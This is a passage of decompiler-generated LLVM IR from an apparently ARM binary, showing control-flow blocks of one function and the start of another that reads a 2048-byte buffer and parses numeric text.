dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d2f8, %dec_label_pc_d2a8
  %v1_d2bc = phi i32 [ %v1_d374, %dec_label_pc_d2f8 ], [ 0, %dec_label_pc_d2a8 ]
  %v5_d2b0 = mul i32 %v1_d2bc, 24
  %v1_d2b4 = load i32, i32* @sl, align 4
  %v2_d2b4 = add i32 %v1_d2b4, %v5_d2b0
  store i32 %v2_d2b4, i32* %r3.global-to-local, align 4
  %v1_d2b8 = add i32 %v2_d2b4, 20
  %v2_d2b8 = inttoptr i32 %v1_d2b8 to i8*
  %v3_d2b8 = load i8, i8* %v2_d2b8, align 1
  %v4_d2b8 = zext i8 %v3_d2b8 to i32
  store i32 %v4_d2b8, i32* %r2.global-to-local, align 4
  %v0_d2bc = load i32, i32* @fp, align 4
  %v4_d2bc = mul i32 %v1_d2bc, 4
  %v5_d2bc = add i32 %v0_d2bc, %v4_d2bc
  %v6_d2bc = inttoptr i32 %v5_d2bc to i32*
  %v7_d2bc = load i32, i32* %v6_d2bc, align 4
  store i32 %v7_d2bc, i32* @r5, align 4
  %v7_d2c4 = icmp eq i8 %v3_d2b8, 31
  store i1 %v7_d2c4, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_d2cc = add i32 %v7_d2bc, 20
  store i32 %v1_d2cc, i32* @r6, align 4
  %tmp33 = icmp ult i8 %v3_d2b8, 32
  br i1 %tmp33, label %dec_label_pc_d3a8, label %dec_label_pc_d2d4

dec_label_pc_d2d4:                                ; preds = %dec_label_pc_d2ac
  store i1 %v3_d2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d2d8, label %dec_label_pc_d3e4, label %dec_label_pc_d2e0

dec_label_pc_d2e0:                                ; preds = %dec_label_pc_d3a8.dec_label_pc_d2e0_crit_edge, %dec_label_pc_d2d4
  %v1_d2e4 = phi i32 [ %v1_d2e4.pre, %dec_label_pc_d3a8.dec_label_pc_d2e0_crit_edge ], [ 65535, %dec_label_pc_d2d4 ]
  store i32 %v3_d170, i32* %r2.global-to-local, align 4
  %v9_d2e4 = icmp eq i32 %v3_d170, %v1_d2e4
  store i1 %v9_d2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d2e4, label %dec_label_pc_d3f8, label %dec_label_pc_d2ec

dec_label_pc_d2ec:                                ; preds = %dec_label_pc_d3e4.dec_label_pc_d2ec_crit_edge, %dec_label_pc_d2e0
  %v1_d2f0 = phi i32 [ %v1_d2f0.pre, %dec_label_pc_d3e4.dec_label_pc_d2ec_crit_edge ], [ %v1_d2e4, %dec_label_pc_d2e0 ]
  store i32 %v3_d174, i32* %r3.global-to-local, align 4
  %v9_d2f0 = icmp eq i32 %v3_d174, %v1_d2f0
  store i1 %v9_d2f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d2f0, label %dec_label_pc_d40c, label %dec_label_pc_d2f8

dec_label_pc_d2f8:                                ; preds = %dec_label_pc_d3f8, %dec_label_pc_d2ec, %dec_label_pc_d40c
  %v2_d2fc = load i32, i32* @r5, align 4
  %v3_d2fc = add i32 %v2_d2fc, 10
  %v4_d2fc = inttoptr i32 %v3_d2fc to i16*
  store i16 0, i16* %v4_d2fc, align 2
  %v0_d300 = load i32, i32* @r5, align 4
  store i32 %v0_d300, i32* @r0, align 4
  %v2_d308 = call i32 @function_dadc(i32 %v0_d300, i32 20)
  %v3_d308 = trunc i32 %v2_d308 to i16
  %v3_d30c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d30c, i32* %r3.global-to-local, align 4
  %v3_d310 = load i32, i32* @r5, align 4
  %v4_d310 = add i32 %v3_d310, 10
  %v5_d310 = inttoptr i32 %v4_d310 to i16*
  store i16 %v3_d308, i16* %v5_d310, align 2
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d318 = load i32, i32* @r6, align 4
  %v3_d318 = add i32 %v2_d318, 6
  %v4_d318 = inttoptr i32 %v3_d318 to i16*
  store i16 0, i16* %v4_d318, align 2
  %v0_d31c = load i32, i32* @r6, align 4
  store i32 %v0_d31c, i32* @r1, align 4
  %v1_d320 = add i32 %v0_d31c, 4
  %v2_d320 = inttoptr i32 %v1_d320 to i16*
  %v3_d320 = load i16, i16* %v2_d320, align 2
  %v4_d320 = zext i16 %v3_d320 to i32
  store i32 %v4_d320, i32* %r2.global-to-local, align 4
  %v0_d324 = load i32, i32* %r3.global-to-local, align 4
  %v1_d324 = add i32 %v0_d324, 12
  store i32 %v1_d324, i32* %r3.global-to-local, align 4
  %v0_d328 = load i32, i32* @r5, align 4
  %v4_d32c = call i32 @function_db2c(i32 %v0_d328, i32 %v0_d31c, i32 %v4_d320, i32 %v1_d324)
  %v5_d32c = trunc i32 %v4_d32c to i16
  %v3_d330 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d330, i32* %r3.global-to-local, align 4
  %v3_d334 = mul i32 %v3_d330, 32
  store i32 %v3_d334, i32* %lr.global-to-local, align 4
  %v3_d338 = load i32, i32* @r6, align 4
  %v4_d338 = add i32 %v3_d338, 6
  %v5_d338 = inttoptr i32 %v4_d338 to i16*
  store i16 %v5_d32c, i16* %v5_d338, align 2
  %v0_d33c = load i32, i32* %lr.global-to-local, align 4
  %v1_d33c = load i32, i32* %r3.global-to-local, align 4
  %tmp34 = mul i32 %v1_d33c, -8
  %v5_d33c = add i32 %v0_d33c, %tmp34
  store i32 %v5_d33c, i32* %lr.global-to-local, align 4
  %v0_d340 = load i32, i32* @r6, align 4
  %v1_d340 = add i32 %v0_d340, 2
  %v2_d340 = inttoptr i32 %v1_d340 to i16*
  %v3_d340 = load i16, i16* %v2_d340, align 2
  %v3_d344 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d344, i32* %r2.global-to-local, align 4
  %v1_d348 = load i32, i32* @sl, align 4
  %v2_d348 = add i32 %v1_d348, %v5_d33c
  store i32 %v2_d348, i32* @lr, align 4
  %v3_d34c = add i32 %v2_d348, 2
  %v4_d34c = inttoptr i32 %v3_d34c to i16*
  store i16 %v3_d340, i16* %v4_d34c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_d358 = load i32, i32* @r5, align 4
  store i32 %v0_d358, i32* @r1, align 4
  %v0_d35c = load i32, i32* %r2.global-to-local, align 4
  %v1_d35c = add i32 %v0_d35c, 32
  store i32 %v1_d35c, i32* @r2, align 4
  %v0_d360 = load i32, i32* @sb, align 4
  store i32 %v0_d360, i32* @r0, align 4
  %v0_d36c = call i32 @function_14a98()
  %v3_d370 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d370, i32* %r3.global-to-local, align 4
  %v1_d374 = add i32 %v3_d370, 1
  %v1_d378 = load i32, i32* @r8, align 4
  %v9_d378 = icmp eq i32 %v1_d374, %v1_d378
  store i1 %v9_d378, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d374, i32* %stack_var_-44, align 4
  %v5_d380 = icmp slt i32 %v1_d374, %v1_d378
  br i1 %v5_d380, label %dec_label_pc_d2ac, label %dec_label_pc_d384

dec_label_pc_d384:                                ; preds = %dec_label_pc_d394, %dec_label_pc_d2f8, %dec_label_pc_d384.preheader
  %v0_d398 = phi i32 [ %v0_d398.ph, %dec_label_pc_d384.preheader ], [ 0, %dec_label_pc_d394 ], [ %v1_d378, %dec_label_pc_d2f8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d388 = icmp eq i32 %v0_d398, 0
  store i1 %v2_d388, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d388, label %dec_label_pc_d394, label %dec_label_pc_d2a8

dec_label_pc_d394:                                ; preds = %dec_label_pc_d384
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_d384

dec_label_pc_d3a8:                                ; preds = %dec_label_pc_d2ac
  %v1_d3a8 = add i32 %v2_d2b4, 16
  %v2_d3a8 = inttoptr i32 %v1_d3a8 to i32*
  %v3_d3a8 = load i32, i32* %v2_d3a8, align 4
  %v1_d3ac = call i32 @function_149d0(i32 %v3_d3a8)
  store i32 %v1_d3ac, i32* @r4, align 4
  %v0_d3b4 = call i32 @function_f570()
  %v3_d3b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d3b8, i32* %r2.global-to-local, align 4
  %v5_d3c0 = mul i32 %v3_d3b8, 24
  %v1_d3c4 = load i32, i32* @sl, align 4
  %v2_d3c4 = add i32 %v1_d3c4, %v5_d3c0
  store i32 %v2_d3c4, i32* %r3.global-to-local, align 4
  %v1_d3c8 = add i32 %v2_d3c4, 20
  %v2_d3c8 = inttoptr i32 %v1_d3c8 to i8*
  %v3_d3c8 = load i8, i8* %v2_d3c8, align 1
  %v4_d3c8 = zext i8 %v3_d3c8 to i32
  store i32 %v4_d3c8, i32* %r2.global-to-local, align 4
  %v0_d3cc = load i32, i32* @r4, align 4
  %v7_d3cc = lshr i32 %v0_d3b4, %v4_d3c8
  %v8_d3cc = add i32 %v7_d3cc, %v0_d3cc
  %v1_d3d0 = call i32 @function_14828(i32 %v8_d3cc)
  %v1_d3d8 = load i32, i32* @r7, align 4
  %v9_d3d8 = icmp eq i32 %v3_d16c, %v1_d3d8
  store i1 %v9_d3d8, i1* %cpsr_z.global-to-local, align 1
  %v1_d3dc = load i32, i32* @r5, align 4
  %v2_d3dc = add i32 %v1_d3dc, 16
  %v3_d3dc = inttoptr i32 %v2_d3dc to i32*
  store i32 %v1_d3d0, i32* %v3_d3dc, align 4
  br i1 %v9_d3d8, label %dec_label_pc_d3e4, label %dec_label_pc_d3a8.dec_label_pc_d2e0_crit_edge

dec_label_pc_d3a8.dec_label_pc_d2e0_crit_edge:    ; preds = %dec_label_pc_d3a8
  %v1_d2e4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d2e0

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3a8, %dec_label_pc_d2d4
  %v0_d3e4 = call i32 @function_f570()
  %v1_d3e4 = trunc i32 %v0_d3e4 to i16
  store i32 %v3_d170, i32* %r2.global-to-local, align 4
  %v1_d3ec = load i32, i32* @r7, align 4
  %v9_d3ec = icmp eq i32 %v3_d170, %v1_d3ec
  store i1 %v9_d3ec, i1* %cpsr_z.global-to-local, align 1
  %v3_d3f0 = load i32, i32* @r5, align 4
  %v4_d3f0 = add i32 %v3_d3f0, 4
  %v5_d3f0 = inttoptr i32 %v4_d3f0 to i16*
  store i16 %v1_d3e4, i16* %v5_d3f0, align 2
  br i1 %v9_d3ec, label %dec_label_pc_d3f8, label %dec_label_pc_d3e4.dec_label_pc_d2ec_crit_edge

dec_label_pc_d3e4.dec_label_pc_d2ec_crit_edge:    ; preds = %dec_label_pc_d3e4
  %v1_d2f0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d2ec

dec_label_pc_d3f8:                                ; preds = %dec_label_pc_d3e4, %dec_label_pc_d2e0
  %v0_d3f8 = call i32 @function_f570()
  %v1_d3f8 = trunc i32 %v0_d3f8 to i16
  store i32 %v3_d174, i32* %r3.global-to-local, align 4
  %v1_d400 = load i32, i32* @r7, align 4
  %v9_d400 = icmp eq i32 %v3_d174, %v1_d400
  store i1 %v9_d400, i1* %cpsr_z.global-to-local, align 1
  %v3_d404 = load i32, i32* @r5, align 4
  %v4_d404 = add i32 %v3_d404, 20
  %v5_d404 = inttoptr i32 %v4_d404 to i16*
  store i16 %v1_d3f8, i16* %v5_d404, align 2
  br i1 %v9_d400, label %dec_label_pc_d40c, label %dec_label_pc_d2f8

dec_label_pc_d40c:                                ; preds = %dec_label_pc_d3f8, %dec_label_pc_d2ec
  %v0_d40c = call i32 @function_f570()
  %v1_d40c = trunc i32 %v0_d40c to i16
  %v3_d410 = load i32, i32* @r6, align 4
  %v4_d410 = add i32 %v3_d410, 2
  %v5_d410 = inttoptr i32 %v4_d410 to i16*
  store i16 %v1_d40c, i16* %v5_d410, align 2
  br label %dec_label_pc_d2f8

dec_label_pc_d418:                                ; preds = %dec_label_pc_d12c
  %v0_d418 = load i32, i32* @sb, align 4
  store i32 %v0_d418, i32* @r0, align 4
  %v1_d41c = call i32 @function_15b20(i32 %v0_d418)
  br label %dec_label_pc_d420

dec_label_pc_d420:                                ; preds = %dec_label_pc_d024, %dec_label_pc_d418
  %v1_d428 = phi i32 [ %v3_d11c, %dec_label_pc_d024 ], [ %v1_d41c, %dec_label_pc_d418 ]
  store i32 %v3_d024, i32* %r4.global-to-local, align 4
  store i32 %v27_d024, i32* %lr.global-to-local, align 4
  ret i32 %v1_d428

; uselistorder directives
  uselistorder i32 %v1_d374, { 2, 0, 3, 1 }
  uselistorder i32 %v5_d33c, { 1, 0 }
  uselistorder i32 %v0_d290, { 1, 0 }
  uselistorder i32 %v1_d214, { 1, 2, 0 }
  uselistorder i32 %v1_d210, { 1, 0, 2, 3 }
  uselistorder i1 %v3_d2d8, { 1, 0 }
  uselistorder i32 %v3_d16c, { 0, 1, 3, 2 }
  uselistorder i1 %v7_d14c, { 1, 0 }
  uselistorder i1 %v7_d120, { 1, 0 }
  uselistorder i32 %v3_d11c, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v5_d078, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 13, 1, 7, 8, 9, 10, 11, 12, 14, 2, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 21, 22, 23, 14, 15, 16, 17, 18, 19, 20, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 14, 15, 10, 11, 12, 16, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 9, 4, 5, 6, 7, 8, 11, 12, 10, 13, 14, 15 }
  uselistorder i8 -16, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d420, { 1, 0 }
  uselistorder label %dec_label_pc_d2f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d198, { 1, 0 }
}

define i32 @function_d430(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d430:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v3_d430 = load i32, i32* @r4, align 4
  %v6_d430 = load i32, i32* @r5, align 4
  %v9_d430 = load i32, i32* @r6, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_d450 = call i32 @function_1320c(i32 %arg1, i32 4)
  %v0_d454 = load i32, i32* @r5, align 4
  store i32 %v0_d454, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d460 = load i32, i32* @r4, align 4
  store i32 %v0_d460, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_d468 = inttoptr i32 %v0_d454 to i32*
  %v6_d468 = call i32 @function_a430(i32 %v0_d460, i32* %v5_d468, i32 2, i32 0)
  %v1_d474 = urem i32 %v6_d468, 256
  store i32 %v1_d474, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d480 = load i32, i32* @r4, align 4
  store i32 %v0_d480, i32* %r0.global-to-local, align 4
  %v0_d484 = load i32, i32* @r5, align 4
  store i32 %v0_d484, i32* %r1.global-to-local, align 4
  %v5_d488 = trunc i32 %v6_d468 to i8
  %v6_d48c = inttoptr i32 %v0_d484 to i32*
  %v7_d48c = call i32 @function_a430(i32 %v0_d480, i32* %v6_d48c, i32 3, i32 65535)
  %v0_d490 = load i32, i32* @r5, align 4
  store i32 %v0_d490, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_d49c = load i32, i32* @r4, align 4
  store i32 %v0_d49c, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_d4a4 = inttoptr i32 %v0_d490 to i32*
  %v6_d4a4 = call i32 @function_a430(i32 %v0_d49c, i32* %v5_d4a4, i32 4, i32 64)
  %v1_d4ac = urem i32 %v6_d4a4, 256
  store i32 %v1_d4ac, i32* %ip.global-to-local, align 4
  %v0_d4b0 = load i32, i32* @r5, align 4
  store i32 %v0_d4b0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d4bc = load i32, i32* @r4, align 4
  store i32 %v0_d4bc, i32* %r0.global-to-local, align 4
  %v6_d4c4 = inttoptr i32 %v0_d4b0 to i32*
  %v7_d4c4 = call i32 @function_a430(i32 %v0_d4bc, i32* %v6_d4c4, i32 5, i32 0)
  %v1_d4d0 = urem i32 %v7_d4c4, 256
  store i32 %v1_d4d0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d4dc = load i32, i32* @r4, align 4
  store i32 %v0_d4dc, i32* %r0.global-to-local, align 4
  %v0_d4e0 = load i32, i32* @r5, align 4
  store i32 %v0_d4e0, i32* %r1.global-to-local, align 4
  %v5_d4e8 = inttoptr i32 %v0_d4e0 to i32*
  %v6_d4e8 = call i32 @function_a430(i32 %v0_d4dc, i32* %v5_d4e8, i32 6, i32 65535)
  %v0_d4ec = load i32, i32* @r5, align 4
  store i32 %v0_d4ec, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d4f8 = load i32, i32* @r4, align 4
  store i32 %v0_d4f8, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_d500 = inttoptr i32 %v0_d4ec to i32*
  %v6_d500 = call i32 @function_a430(i32 %v0_d4f8, i32* %v5_d500, i32 7, i32 53)
  %v0_d508 = load i32, i32* @r5, align 4
  store i32 %v0_d508, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v6_d500, i32* @fp, align 4
  %v0_d518 = load i32, i32* @r4, align 4
  store i32 %v0_d518, i32* %r0.global-to-local, align 4
  %v4_d51c = inttoptr i32 %v0_d508 to i32*
  %v5_d51c = call i32 @function_a430(i32 %v0_d518, i32* %v4_d51c, i32 9, i32 65535)
  %v0_d520 = load i32, i32* @r5, align 4
  store i32 %v0_d520, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 %v5_d51c, i32* @sb, align 4
  %v0_d530 = load i32, i32* @r4, align 4
  store i32 %v0_d530, i32* %r0.global-to-local, align 4
  %v4_d534 = inttoptr i32 %v0_d520 to i32*
  %v5_d534 = call i32 @function_a430(i32 %v0_d530, i32* %v4_d534, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d540 = load i32, i32* @r5, align 4
  store i32 %v0_d540, i32* %r1.global-to-local, align 4
  store i32 %v5_d534, i32* @sl, align 4
  %v0_d548 = load i32, i32* @r4, align 4
  store i32 %v0_d548, i32* %r0.global-to-local, align 4
  %v5_d54c = inttoptr i32 %v0_d540 to i32*
  %v6_d54c = call i32 @function_9f04(i32 %v0_d548, i32* %v5_d54c, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_d558 = call i32 @function_11a94(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_d564 = call i32 @function_119d0(i32 30, i32* null)
  store i32 %v3_d564, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d56c = call i32 @function_130e0(i32 %v3_d564, i32 0)
  store i32 %v2_d56c, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_d578 = call i32 @function_119f4(i32 30)
  store i32 %v1_d578, i32* %r0.global-to-local, align 4
  %v0_d57c = load i32, i32* @r4, align 4
  %v1_d57c = icmp slt i32 %v0_d57c, 0
  %v2_d57c = icmp eq i32 %v0_d57c, 0
  store i1 %v2_d57c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_d57c, label %dec_label_pc_da30, label %dec_label_pc_d584

dec_label_pc_d584:                                ; preds = %dec_label_pc_d430
  %v2_d588 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_d588, i32* @r7, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_d588, i32* %r1.global-to-local, align 4
  store i32 %v0_d57c, i32* %r0.global-to-local, align 4
  %v3_d598 = call i32 @function_15b9c(i32 %v0_d57c, i32 %v2_d588, i32 2048)
  store i32 %v3_d598, i32* @r5, align 4
  %v0_d5a0 = load i32, i32* @r4, align 4
  store i32 %v0_d5a0, i32* @r0, align 4
  %v1_d5a4 = call i32 @function_15b20(i32 %v0_d5a0)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_d5ac = call i32 @function_11a94(i32 31)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_d5b8 = call i32 @function_119d0(i32 31, i32* null)
  %v0_d5bc = load i32, i32* @r5, align 4
  store i32 %v0_d5bc, i32* @r1, align 4
  store i32 %v3_d5b8, i32* %r2.global-to-local, align 4
  store i32 %v2_d588, i32* %r0.global-to-local, align 4
  %v3_d5c8 = bitcast i32* %stack_var_-2124 to i8*
  %v4_d5c8 = call i32 @function_12680(i8* %v3_d5c8, i32 %v0_d5bc, i32 %v3_d5b8)
  store i32 %v4_d5c8, i32* @r6, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_d5d4 = call i32 @function_119f4(i32 31)
  store i32 %v1_d5d4, i32* %r0.global-to-local, align 4
  %v0_d5d8 = load i32, i32* @r6, align 4
  %v7_d5d8 = icmp eq i32 %v0_d5d8, -1
  store i1 %v7_d5d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d5d8, label %dec_label_pc_da30, label %dec_label_pc_d5e0

dec_label_pc_d5e0:                                ; preds = %dec_label_pc_d584
  %v0_d5e0 = load i32, i32* @r5, align 4
  %v9_d5e0 = icmp eq i32 %v0_d5e0, %v0_d5d8
  store i1 %v9_d5e0, i1* %cpsr_z.global-to-local, align 1
  %v7_d5e4 = icmp sgt i32 %v0_d5e0, %v0_d5d8
  br i1 %v7_d5e4, label %dec_label_pc_d5e8, label %dec_label_pc_da30

dec_label_pc_d5e8:                                ; preds = %dec_label_pc_d5e0
  %v0_d5e8 = load i32, i32* @r7, align 4
  %v2_d5e8 = add i32 %v0_d5e8, %v0_d5d8
  store i32 %v2_d5e8, i32* %r1.global-to-local, align 4
  store i32 %v0_d5d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_d614 = add i32 %v0_d5e0, -1
  br label %dec_label_pc_d60c

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d634, %bb79
  %v9_d5f8 = icmp eq i32 %v1_d614, %v0_d600
  store i1 %v9_d5f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d5f8, label %dec_label_pc_d644, label %dec_label_pc_d600

dec_label_pc_d600:                                ; preds = %dec_label_pc_d624, %dec_label_pc_d5f8, %bb
  %v0_d63019 = phi i32 [ %v0_d630, %dec_label_pc_d624 ], [ %v0_d63020, %dec_label_pc_d5f8 ], [ %v0_d630, %bb ]
  %v0_d61015 = phi i32 [ 0, %dec_label_pc_d624 ], [ %v0_d61016, %dec_label_pc_d5f8 ], [ 0, %bb ]
  %v1_d600 = add i32 %v0_d600, 1
  store i32 %v1_d600, i32* %r2.global-to-local, align 4
  %v9_d604 = icmp eq i32 %v1_d600, %v0_d5e0
  store i1 %v9_d604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d604, label %dec_label_pc_da30, label %dec_label_pc_d60c

dec_label_pc_d60c:                                ; preds = %dec_label_pc_d600, %dec_label_pc_d5e8
  %v0_d600 = phi i32 [ %v1_d600, %dec_label_pc_d600 ], [ %v0_d5d8, %dec_label_pc_d5e8 ]
  %v0_d630 = phi i32 [ %v0_d63019, %dec_label_pc_d600 ], [ 0, %dec_label_pc_d5e8 ]
  %v0_d610 = phi i32 [ %v0_d61015, %dec_label_pc_d600 ], [ 0, %dec_label_pc_d5e8 ]
  %v0_d618 = phi i32 [ %v1_d618, %dec_label_pc_d600 ], [ %v2_d5e8, %dec_label_pc_d5e8 ]
  %v1_d60c = inttoptr i32 %v0_d618 to i8*
  %v2_d60c = load i8, i8* %v1_d60c, align 1
  %v3_d60c = zext i8 %v2_d60c to i32
  store i32 %v3_d60c, i32* %r3.global-to-local, align 4
  %v2_d610 = icmp eq i32 %v0_d610, 0
  store i1 %v2_d610, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d614, i32* @r4, align 4
  %v1_d618 = add i32 %v0_d618, 1
  store i32 %v1_d618, i32* %r1.global-to-local, align 4
  %v1_d61c = add nsw i32 %v3_d60c, -48
  store i32 %v1_d61c, i32* %r0.global-to-local, align 4
  br i1 %v2_d610, label %dec_label_pc_d624, label %dec_label_pc_d634

dec_label_pc_d624:                                ; preds = %dec_label_pc_d60c
  %v7_d624 = icmp eq i8 %v2_d60c, 9
  store i1 %v7_d624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d624, label %dec_label_pc_d600, label %bb

bb:                                               ; preds = %dec_label_pc_d624
  %v8_d628 = icmp eq i8 %v2_d60c, 32
  store i1 %v8_d628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d628, label %dec_label_pc_d600, label %dec_label_pc_d630

dec_label_pc_d630:                                ; preds = %bb
  %v1_d630 = add i32 %v0_d630, 1
  store i32 %v1_d630, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d634

dec_label_pc_d634:                                ; preds = %dec_label_pc_d60c, %dec_label_pc_d630
  %v0_d63020 = phi i32 [ %v0_d630, %dec_label_pc_d60c ], [ %v1_d630, %dec_label_pc_d630 ]
  %v0_d61016 = phi i32 [ %v0_d610, %dec_label_pc_d60c ], [ %v1_d630, %dec_label_pc_d630 ]
  %v7_d634 = icmp eq i8 %v2_d60c, 46
  store i1 %v7_d634, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d634, label %dec_label_pc_d5f8, label %bb79

bb79:                                             ; preds = %dec_label_pc_d634
  %v8_d638 = icmp eq i32 %v1_d61c, 9
  store i1 %v8_d638, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_d61c, 10
  br i1 %tmp, label %dec_label_pc_d5f8, label %dec_label_pc_d640

dec_label_pc_d640:                                ; preds = %bb79
  store i32 %v0_d600, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d644

dec_label_pc_d644:                                ; preds = %dec_label_pc_d5f8, %dec_label_pc_d640
  %v0_d60090 = phi i32 [ %v0_d600, %dec_label_pc_d640 ], [ %v1_d614, %dec_label_pc_d5f8 ]
  %v2_d648 = sub i32 %v0_d60090, %v0_d5d8
  store i32 %v2_d648, i32* @r4, align 4
  %v2_d64c = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_d64c, i32* @r5, align 4
  store i32 %v2_d5e8, i32* %r1.global-to-local, align 4
  store i32 %v2_d64c, i32* %r0.global-to-local, align 4
  store i32 %v2_d648, i32* %r2.global-to-local, align 4
  %v3_d65c = call i32 @function_12394(i32 %v2_d64c, i32 %v2_d5e8, i32 %v2_d648)
  %v2_d660 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_d660, i32* %r1.global-to-local, align 4
  %v1_d664 = load i32, i32* @r4, align 4
  %v2_d664 = add i32 %v1_d664, %v2_d660
  store i32 %v2_d664, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d64c, i32* @r0, align 4
  %v3_d670 = add i32 %v2_d664, -36
  %v4_d670 = inttoptr i32 %v3_d670 to i8*
  store i8 0, i8* %v4_d670, align 1
  %v1_d674 = call i32 @function_14860(i32 %v2_d64c)
  store i32 %v1_d674, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d67c

dec_label_pc_d67c3:                               ; preds = %dec_label_pc_da30
  unreachable

dec_label_pc_d67c:                                ; preds = %dec_label_pc_dabc, %dec_label_pc_daac, %dec_label_pc_da94, %dec_label_pc_da7c, %dec_label_pc_d644
